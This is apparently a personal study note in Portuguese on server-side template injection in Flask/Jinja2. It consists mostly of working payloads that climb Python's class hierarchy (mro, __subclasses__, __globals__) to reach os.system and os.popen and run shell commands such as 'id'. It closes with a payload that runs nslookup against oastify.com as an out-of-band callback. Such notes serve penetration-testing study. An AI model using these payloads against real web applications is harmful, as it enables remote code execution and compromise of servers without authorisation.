# SSTI Jinja2

{% embed url="https://www.lanmaster53.com/2016/03/exploring-ssti-flask-jinja2/" %}

{% embed url="https://jinja.palletsprojects.com/en/stable/" %}

Testes\
\{{'teste'.replace('e','D')\}}\
\
\
\_\_class\_\_

\
import system\
os.system('id')



RCE a partir de uma string utilizando o os.\_wrap\_close

nome.\_\_class\_\_.mro()\[1].\_\_subclasses\_\_()\[127].\_\_init\_\_.\_\_globals\_\_

nome.\_\_class\_\_.mro()\[1].\_\_subclasses\_\_()\[127].\_\_init\_\_.\_\_globals\_\_\['system']\('id')



Portanto, a partir de uma string conseguimos acessar a biblioteca str do Python. A biblioteca str do Python utiliza a função os.\_wrap\_close do Python. Voltamos para o **init**, que é o construtor da os. E do construtor da os acessamos as variáveis e funções globais da lib os do Python, e com isso usamos a função system.\
\
\
rce a partir de bibliotecas built in do Python que importam o os

\{{'caique'.\_\_class\_\_.mro()\[2].\_\_subclasses\_\_()\[131].\_\_init\_\_.\_\_globals\_\_\['os'].popen('id').read()\}}



\{{'caique'        "string"

.\_\_class\_\_.mro()\[2]        "object"

.\_\_subclasses\_\_()\[131]        "socket"\
\
.\_\_init\_\_.\_\_globals\_\_        "globals da lib socket"\
\
\['os'].popen('id').read()        "popen do os" \
\
\}}







EASY MODE\
\
Payload all the things

{% embed url="https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756" %}

{% @github-files/github-code-block url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" %}

```
{{self.__init__.__globals__.__builtins__.__import__('os').popen('nslookup oastify.com').read()}}
```



